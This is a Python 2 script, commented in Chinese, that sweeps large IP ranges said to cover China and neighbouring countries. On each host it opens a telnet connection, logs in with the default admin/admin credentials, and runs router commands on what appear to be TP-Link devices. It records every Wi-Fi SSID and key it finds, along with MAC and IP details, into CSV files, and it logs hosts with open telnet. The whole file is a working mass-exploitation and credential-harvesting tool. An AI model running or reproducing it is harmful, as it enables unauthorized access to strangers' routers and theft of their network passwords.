# coding=utf-8
import threading
import time
import csv
import telnetlib
import os
import sys

# 优化tcp连接，实际上没有多大效果，因为kali 2.0中“ulimit -n”为65536，并且实际上并发的线程最多到2万（16核cpu，16G内存）
os.system("sysctl -p 999-xaltin-tcp.conf")
os.system("sysctl -w net.ipv4.route.flush=1")
# 默认用户名和密码
username = "admin"
password = "admin"
tn = 2000  # 设定每次并发的线程数量，目的是防止一次性导入大量ip消耗内存
TIMEOUT = 10  # 设定超时为10秒，可以设置小一些，但是程序已经运行了，不想停下来
fk = threading.Lock()  # 文件锁，在写入wifi信息时使用，确保完整写入一行
fk_un = threading.Lock()  # 文件锁，已打开telnet连接，但是没有返回“username:”字符串，用于记录开放telnet端口的主机
fk_nd = threading.Lock()  # 文件锁，应该为具有漏洞的路由器，但是已更改默认的用户名和密码，用于记录具有漏洞的路由器
fk_er = threading.Lock()  # 文件锁，主机开机但是没有或者拒绝telnet连接，用于记录开机的主机

def ip2num(ip):  # 将ip地址转换为数字
    ip = [int(x) for x in ip.split('.')]
    return ip[0] << 24 | ip[1] << 16 | ip[2] << 8 | ip[3]

def num2ip(num):  # 将数字转换为ip地址
    return '%s.%s.%s.%s' % ((num & 0xff000000) >> 24, (num & 0x00ff0000) >> 16,
                            (num & 0x0000ff00) >> 8, num & 0x000000ff)

class bThread(threading.Thread):
    def __init__(self, ip):
        threading.Thread.__init__(self)
        self.ip = ip

    def run(self):
        try:
            tn = telnetlib.Telnet(self.ip, timeout=TIMEOUT)
            try:
                un = tn.read_until("username:", TIMEOUT)
                # 此时已建立telnet连接，但没有接收到“username:”，直接记录开放telnet的主机，关闭线程
                if un.find("username:") < 0:
                    if fk_un.acquire():
                        tn_open_only_writer.writerow((time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time())),
                                                      self.ip, " ".join(un.split())))
                        fk_un.release()
                    tn.close()
                    exit(1)

            except Exception, e:
                if fk_un.acquire():
                    tn_open_only_writer.writerow((time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time())),
                                                  self.ip, "Error occured: " + str(e)))
                    fk_un.release()
                tn.close()
                exit(1)

            tn.write(username + "\n")
            tn.read_until("password:", TIMEOUT)
            tn.write(password + "\n")

            tn.write("wlctl show\n")
            try:
                wlctl = tn.read_until("cmd:SUCC", TIMEOUT)
                # 说明默认用户名和密码已更改，或者不支持wlctl命令，记录留待备查
                if wlctl.find("cmd:SUCC") < 0:
                    if fk_nd.acquire():
                        not_default_login_writer.writerow((time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time())),
                                                           self.ip, " || ".join(wlctl.split())))
                        fk_nd.release()
                    tn.close()
                    exit(1)

            except Exception, e:
                if fk_nd.acquire():
                    not_default_login_writer.writerow((time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time())),
                                                       self.ip, "%s || error: %s" % (" ".join(wlctl.split()), str(e))))
                    fk_nd.release()
                tn.close()
                exit(1)

            tn.write("lan show info\n")
            laninfo = tn.read_until("cmd:SUCC", TIMEOUT)
            tn.close()
            wlctl_dc = dict([x.split("=", 1) for x in wlctl.split() if len(x.split("=", 1)) == 2])
            laninfo_dc = dict([x.split("=", 1) for x in laninfo.split() if len(x.split("=", 1)) == 2])

            try:
                SSID = wlctl_dc['SSID']
            except:
                SSID = 'Error!!!SSID'
            try:
                Key = wlctl_dc['Key']
            except:
                Key = 'Error!!!Key'
            try:
                X_TPLINK_MACAddress = laninfo_dc['X_TPLINK_MACAddress']
            except:
                X_TPLINK_MACAddress = 'Error!!!X_TPLINK_MACAddress'
            try:
                IPRouters = laninfo_dc['IPRouters']
            except:
                IPRouters = 'Error!!!IPRouters'
            try:
                IPInterfaceIPAddress = laninfo_dc['IPInterfaceIPAddress']
            except:
                IPInterfaceIPAddress = 'Error!!!IPInterfaceIPAddress'

            if fk.acquire():
                writer.writerow((time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time())),
                                 self.ip,
                                 SSID,
                                 Key,
                                 X_TPLINK_MACAddress,
                                 IPRouters,
                                 IPInterfaceIPAddress))
                fk.release()
                exit(0)
        except:
            pass

if __name__ == "__main__":
    reload(sys)
    sys.setdefaultencoding('utf-8')  # 避免输出乱码
    count = 0  # 记录导入ip的下标，循环使用
    suma = 0  # 记录处理ip的总数
    qu = [0 for i in range(tn)]  # 初始化导入ip的列表
    t1 = time.time()  # 记录程序运行开始时间
    print time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(t1))

    '''
        csvfile：记录存在漏洞的wifi相关信息
        tn_open_only：记录开放telnet端口的主机
        not_default_login：存在漏洞的wifi，但是更改了默认用户名和密码
        writer，tn_open_only_writer，not_default_login_writer为对应的csv.writer
    '''
    csvfile = file("./output/wifi-test.csv", 'ab')
    tn_open_only = file("./output/tn_open_only.csv", 'ab')
    not_default_login = file("./output/not_default_login.csv", 'ab')
    writer = csv.writer(csvfile)
    tn_open_only_writer = csv.writer(tn_open_only)
    not_default_login_writer = csv.writer(not_default_login)

    '''
        记录处理进程，格式示例：
        --------时间	-------    -起始ip-   ---终止ip---  -----------落地信息-----------
        2015-10-10 22:00:36 || 1.12.0.0: 1.12.255.255: 北京市 北京北大方正宽带网络科技有限公司
        2015-10-10 22:02:05 || 已处理 65536 个ip；每分钟处理 44254.10 个ip
    '''
    logfile = file("./output/log.txt", 'ab')

    with open('ip.csv', 'rb') as f:  # ip.csv包含了中国以及周边国家的ip地址，来源于纯真ip数据库
        reader = csv.reader(f, delimiter=',', quotechar='"')
        for row in reader:  # 第一循环：取ip.csv中的每一行
            line1 = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time())) + \
                    " || " + ": ".join(row[1:4]).decode("gbk")
            logfile.write(line1 + "\n")  # 记录起始时间、起始ip、终止ip、落地信息
            print line1

            for num in range(ip2num(row[1]), ip2num(row[2]) + 1):  # 第二循环：创建ip.csv中每一行的ip范围
                qu[count] = num2ip(num)  # 加入到ip列表
                count += 1 # 导入ip的下标动态增长
                if count == tn:  # 防止导入过多ip消耗内存，当count == tn时开始循环建立线程
                    for ip in qu:  # 对应qu中的ip，一次性建立并发线程
                        bThread(ip).start()
                    print threading.active_count()
                    # 防止突破系统允许的最大线程数（can't create new thread），直至线程回落到安全范围
                    if threading.active_count() >= (32000 - tn):
                        while True:
                            if threading.active_count() < (32000 - tn):
                                break
                    count = 0  # 将qu列表中的ip下标重新置0

            suma += (ip2num(row[2]) - ip2num(row[1]) + 1)  # 迭加总共处理的ip数量
            line2 = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time())) + \
                    " || " + "已处理 %d" % suma + " 个ip；每分钟处理 %.2f" % (suma / (time.time() - t1) * 60) + " 个ip"
            logfile.write(line2 + "\n\n")  # 记录时间、处理的ip总数、每分钟处理的ip数量
            logfile.flush()  # 将log记录flush并fsync，保存处理状态，可以断点续搜
            os.fsync(logfile.fileno())  # flush()和fsync()在频繁访问文件的背景下慎用，损耗性能
            print line2

        if count > 0:  # 处理循环结束后剩余的ip地址ssssds
            for ip in qu[:count]:
                bThread(ip).start()

    time.sleep(TIMEOUT * 5)  # 等待5个TIMEOUT，等待所有进程运行完毕

    csvfile.close()
    tn_open_only.close()
    not_default_login.close()
    logfile.close()

    t2 = time.time()
    print "SUCCESS!!!" + time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(t2))

    with open('timelog.txt', 'wb') as f:
        f.write(["Start: ", str(time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(t1))),
                 "\nEnd: ", str(time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(t2))),
                 "\n", str(suma+count), " ip passed!"])
